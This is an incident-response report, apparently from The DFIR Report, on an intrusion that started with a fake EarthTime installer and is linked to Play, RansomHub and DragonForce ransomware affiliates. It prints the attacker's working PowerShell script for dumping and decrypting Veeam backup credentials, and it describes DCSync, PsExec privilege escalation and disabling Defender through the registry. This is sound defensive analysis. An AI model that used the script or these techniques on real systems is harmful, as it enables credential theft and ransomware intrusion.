			<h1 class="entry-title">Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/" rel="bookmark"><time class="entry-date published" datetime="2025-09-08T14:20:31+00:00">September 8, 2025</time></a></span>		</div><!-- .entry-meta -->

<h2 class="wp-block-heading">Key Takeaways</h2>



<ul class="wp-block-list">
<li>The intrusion began when a user downloaded and executed a malicious file impersonating DeskSoft&#8217;s EarthTime application but instead dropped SectopRAT malware.</li>



<li>The threat actor deployed multiple malware families, including SystemBC for proxy tunneling, and later Betruger backdoor for additional capabilities. They leveraged various tools such as AdFind, SharpHound, SoftPerfect NetScan, and GT_NET.exe (Grixba) to map out the environment and perform reconnaissance activities.</li>



<li>Lateral movement was primarily accomplished through RDP connections, with additional use of Impacket&#8217;s wmiexec. The threat actor moved across multiple systems, including domain controllers, backup servers, and file servers, while maintaining persistence through local account creation and startup folder shortcuts.</li>



<li>Data collection and exfiltration were performed using WinRAR to compress targeted file shares containing sensitive business documents, which were then transferred via WinSCP to an FTP server hosted by a cloud provider in clear text.</li>



<li>The discovery of Grixba (a reconnaissance tool linked to Play ransomware), a previous NetScan output containing data from a company reportedly compromised by DragonForce ransomware, and the use of the Betruger backdoor suggest that the likely objective of this intrusion was ransomware deployment. Based on these findings, the threat actor behind this intrusion was most likely an affiliate operating across multiple ransomware groups.</li>
</ul>

<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The intrusion began in September 2024 with a download of a malicious file mimicking the EarthTime application by DeskSoft. Upon execution, SectopRAT was deployed which opened a connection to its command and control (C2) infrastructure. The threat actor established persistence by relocating the malicious file and placing a shortcut in the Startup folder, configured to trigger on user logon. They further elevated access by creating a new local account and assigning it local administrative privileges.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Soon after establishing the initial access, the malware deployed SystemBC. They then accessed the beachhead host via RDP using the newly created local account and executed discovery commands. At this stage, the threat actor completed a DCSync attack against a domain controller. They then followed up by connecting to the domain controller over RDP with the built-in Administrator account and used PsExec to execute SystemBC with SYSTEM privileges on the host. Using their existing proxy tunnel, the threat actor once again used RDP to connect to hosts in the environment. While on the domain controller, we observed the threat actor using Windows utilities, such as ipconfig and nltest, to perform an enumeration.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Over the next few hours, the threat actor connected to several servers using RDP and deployed SystemBC across the environment. On a backup server, they executed a PowerShell script designed to retrieve Veeam credentials.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the second day, the threat actor used RDP to move laterally to the file server where they dropped a WinRAR executable and archived specific file shares. They transferred the resulting archives to a U.S. based cloud host over unencrypted FTP using WinSCP. This enabled the retrieval of credentials, among other details, during traffic analysis. The threat actor also resumed discovery activity with the use of Grixba, a tool associated with Play Ransomware that uses WMI and WinRM to discover users and systems across the network, which was executed from both the domain controller and a backup server. They carried out further discovery activity with the use of AdFind for AD queries, PowerShell Cmdlets to collect host data, SharpHound for directory mapping, and SoftPerfect NetScan to scan remote hosts.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the sixth day of the intrusion, SectopRAT spawned a new payload on the beachhead host. The new payload executed was Betruger, a multi-function backdoor. The threat actor also used wmiexec to enumerate remote hosts through various reconnaissance commands executed on the domain controller.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Throughout the intrusion, the threat actor used multiple defense evasion techniques, including process injection, timestomping, disabling Microsoft Defender’s protections, and deploying binaries with spoofed metadata to disguise themselves as legitimate cybersecurity tools such as SentinelOne and Avast Antivirus.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>While no final actions were observed during this intrusion before the threat actor was evicted, the evidence shows links to three different ransomware operations. The <a href="https://www.security.com/threat-intelligence/play-ransomware-volume-shadow-copy" target="_blank" rel="noreferrer noopener">Grixba tooling</a> has been associated with the <a href="https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-play" target="_blank" rel="noreferrer noopener">Play ransomware</a> group. Similarly the Betruger backdoor has been <a href="https://www.broadcom.com/support/security-center/protection-bulletin/custom-betruger-backdoor-deployed-by-ransomhub-affiliate" target="_blank" rel="noreferrer noopener">linked to Ransomhub</a> affiliated threat actors. And finally with opsec failures, the threat actor dropped the results of prior netscan discovery that appeared to contain data from a company that had been posted to the <a href="https://www.group-ib.com/blog/dragonforce-ransomware/" target="_blank" rel="noreferrer noopener">DragonForce Ransomware</a> leak site prior in 2024. With each of these indicators we assess this threat actor was active as an affiliate for multiple ransomware groups.</p>

<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>EarthTime.exe</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The EarthTime.exe binary was executed from the Downloads folder. The parent process was explorer.exe, suggesting it was executed by the victim clicking on the executable. EarthTime.exe appeared to be mimicking the legitimate EarthTime application by DeskSoft. The real EarthTime is a world clock utility that lets users track multiple time zones and view astronomical data like sunrise and sunset times for different locations. It&#8217;s particularly useful for business users and travelers who need to coordinate across time zones.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/32034_007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-48020" src="https://thedfirreport.com/wp-content/uploads/2025/09/32034_007.png" alt="" width="1500" height="1104" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/32034_007.png 1500w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_007-300x221.png 300w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_007-1024x754.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_007-768x565.png 768w" sizes="auto, (max-width: 1500px) 100vw, 1500px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>This malicious version had been signed with a revoked certificate from &#8220;Brave Pragmatic Network Technology Co., Ltd.&#8221; &#8211; likely an attempt to make it look legitimate to both users and security software. Brave Pragmatic Network Technology Co., Ltd. appears to be a compromised or fraudulent certificate authority that has been observed signing multiple malware samples, with security researchers tracking various malicious executables bearing certificates from this entity.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/32034_008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-47955" src="https://thedfirreport.com/wp-content/uploads/2025/09/32034_008.png" alt="" width="2024" height="1386" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/32034_008.png 2024w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_008-300x205.png 300w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_008-1024x701.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_008-768x526.png 768w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_008-1536x1052.png 1536w" sizes="auto, (max-width: 2024px) 100vw, 2024px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/32034_073.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-48021" src="https://thedfirreport.com/wp-content/uploads/2025/09/32034_073.png" alt="" width="2250" height="710" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/32034_073.png 2250w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_073-300x95.png 300w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_073-1024x323.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_073-768x242.png 768w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_073-1536x485.png 1536w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_073-2048x646.png 2048w" sizes="auto, (max-width: 2250px) 100vw, 2250px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The choice to impersonate EarthTime makes sense from the threat actor&#8217;s perspective, as people are generally more willing to run software they recognize. A file named &#8220;EarthTime.exe&#8221; is far less suspicious than something with a random or obviously malicious name, making this a classic example of social engineering through software masquerading.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/32034_009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-47956" src="https://thedfirreport.com/wp-content/uploads/2025/09/32034_009.png" alt="" width="1274" height="1552" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/32034_009.png 1274w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_009-246x300.png 246w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_009-841x1024.png 841w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_009-768x936.png 768w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_009-1261x1536.png 1261w" sizes="auto, (max-width: 1274px) 100vw, 1274px" /></a></p>

<p>EarthTime.exe spawned cmd.exe with no command line arguments. This cmd.exe process went on to spawn MSBuild.exe with the CurrentDirectory set to the user’s downloads folder. MSBuild.exe is a legitimate binary signed by Microsoft, but it is unusual for it to be executed with no command-line arguments. Red Canary has previously <a href="https://redcanary.com/blog/threat-intelligence/msix-installers/" target="_blank" rel="noreferrer noopener">observed</a> this activity linked to the SecTopRAT/ArechClient2, a .NET RAT tool, which also inspired the following <a href="https://github.com/Bert-JanP/Hunting-Queries-Detection-Rules/blob/main/Defender%20For%20Endpoint/ttp_t1127-001_suspNetworkConnMSBuild.md" target="_blank" rel="noreferrer noopener">threat hunting query</a>, which would detect this activity. Process chains where SecTopRat/ArechClient2 has been injected into both cmd.exe and a subsequent msbuild.exe child process have been commonly observed, such as by <a href="https://redcanary.com/blog/threat-intelligence/intelligence-insights-april-2025/" target="_blank" rel="noreferrer noopener">Red Canary</a> and <a href="https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/" target="_blank" rel="noreferrer noopener">The DFIR Report</a>.</p>

<!-- wp:image -->
<figure class="wp-block-image"></figure>

<p>The threat actors leveraged Microsoft Sysinternals&#8217; PsExec utility for local privilege escalation on the compromised host. By utilizing the &#8220;-s&#8221; parameter, the adversaries were able to execute malicious binaries with SYSTEM-level privileges, effectively escalating from their initial user-level access to the highest administrative privileges on the Windows system.</p>

<p>During the initial access malware execution a SectopRAT binary was written to <i>%AppData%\Local\Temp</i> as bhnwcwgaphpge. This was then injected into the MSBuild.exe process to run the malware.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/32034_031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-47978" src="https://thedfirreport.com/wp-content/uploads/2025/09/32034_031.png" alt="" width="941" height="989" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/32034_031.png 941w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_031-285x300.png 285w, https://thedfirreport.com/wp-content/uploads/2025/09/32034_031-768x807.png 768w" sizes="auto, (max-width: 941px) 100vw, 941px" /></a></p>

<!-- wp:paragraph -->
<p>Two of the binaries observed in this attack were masquerading as products from well-known and reputable security vendors.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The first binary, <i><strong>GT_NET.exe</strong></i> is associated with Grixba, a custom data-gathering tool used by the Play ransomware group. Its metadata was crafted to impersonate SentinelOne security software, complete with fake product names, descriptions, and copyright information referencing &#8220;Sentinel Labs, Inc.&#8221; The team from <a href="https://fieldeffect.com/blog/grixba-play-ransomware-impersonates-sentinelone" target="_blank" rel="noreferrer noopener">Field Effect</a> also noticed this, as per their blog back in January of this year.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The second binary, <i><strong>ccs.exe</strong></i> contains the Betruger backdoor commonly deployed by RansomHub affiliates. This malware was designed with extensive metadata mimicking Avast Antivirus, including legitimate-appearing product names, version numbers, and copyright information. The threat actors even used a filename convention (&#8220;aswAvBootTimeScanShMin.exe&#8221;) that closely resembles authentic Avast components.</p>

<p>We also observed the threat actor attempting to disable Windows Defender&#8217;s security features by modifying critical registry keys on the domain controller and backup server. Examining the registry events reveals a step-by-step approach to disable multiple Windows Defender registry keys, including real-time scanning, behavior monitoring, anti-spyware detection, and network protection. These registry changes focused on the Windows Defender policy area (<i>HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\</i>), showing the threat actor wanted to make system-wide security changes that would last through reboots and affect all users. By targeting the policy registry instead of user-specific settings, the threat actor made sure they had maximum impact while keeping their changes in place during their attack.</p>

<p><strong>Information Stealers</strong></p>

<!-- wp:paragraph -->
<p><strong>Veeam Database Credential Dumping</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Windows Event ID 4104 from the Microsoft-Windows-PowerShell/Operational log is generated by PowerShell&#8217;s script block logging feature, which records the execution of PowerShell scripts. This artifact revealed that the threat actor executed a script on the backup server to extract credentials from a Veeam database. The script contains multiple sections, which have been broken down into smaller parts for better readability.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The first section queries the Windows Registry for SQL Server instances and targets a hardcoded database named &#8220;VeeamBackup&#8221;. The $SQLQuery variable was configured to retrieve the top 1000 rows from the Credentials table within the VeeamBackup database:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">"# SQL Server and database\\"
$hostname = hostname
"$SQLInstances = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server').InstalledInstances"
"$SQLServer = \"$hostname\\$SQLInstances\" #use Server\\Instance for named SQL instances! "
"$SQLDBName = \"VeeamBackup\""
"# SQL Query"
"$SqlQuery = \"SELECT TOPdatabase (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials]\""
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The next section of the script establishes a connection to the SQL Server database, executes the query stored in the $SQLQuery variable, stores the results in a dataset, and then closes the connection:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">"# Connection string "

$SqlConnection = New-Object System.Data.SqlClient.SqlConnection
"$SqlConnection.ConnectionString = \"Server = $SQLServer; Database = $SQLDBName; Integrated Security = True\"  
$SqlCmd = New-Object System.Data.SqlClient.SqlCommand
$SqlCmd.CommandText = $SqlQuery
$SqlCmd.Connection = $SqlConnection
$SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
$SqlAdapter.SelectCommand = $SqlCmd
$Result= New-Object System.Data.DataSet
$SqlAdapter.Fill($Result)

"#Close the connection "
$SqlConnection.Close()
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The next section of the script was used to convert DataTable rows to PowerShell objects:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">$MyArray = ForEach ($Row in $Result.Tables[0].Rows) {
    $Record = New-Object PSObject
    ForEach ($Col in $Result.Tables[0].Columns.ColumnName) {
        Add-Member -InputObject $Record -NotePropertyName $Col -NotePropertyValue $Row.$Col
    }
    $Record
}
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The final section of the script contains a for loop that performs the following actions:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Iterates through each item in the $MyArray variable</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Loads the DLL Veeam.Backup.Common.dll (required to access the class needed for password decryption)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Uses Veeam&#8217;s ProtectedStorage class to decrypt the encoded passwords</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Displays usernames, decrypted passwords, and descriptions to the console</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">for ($i = 0; $i -lt $MyArray.Length; $i++) {
    Add-Type -Path "C:\Program Files\Veeam\Backup and Replication\Backup Catalog\Veeam.Backup.Common.dll"

    $encoded = $MyArray.password[$i]
    $pass = [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded)

    Write-Host "=================="
    Write-Host "user_name:  " $MyArray.user_name[$i]
    Write-Host "password:   " $pass
    Write-Host "description:" $MyArray.description[$i]
    Write-Host "=================="
</pre>
<!-- /wp:preformatted -->

<p><strong>Betruger Backdoor</strong></p>

<p><strong>Impacket</strong></p>

<p><strong>Betruger</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After the deployment of the Betruger backdoor on day six, multiple Windows Event IDs 4776 (credential validation) were observed, indicating successful network authentication attempts against the beachhead system.
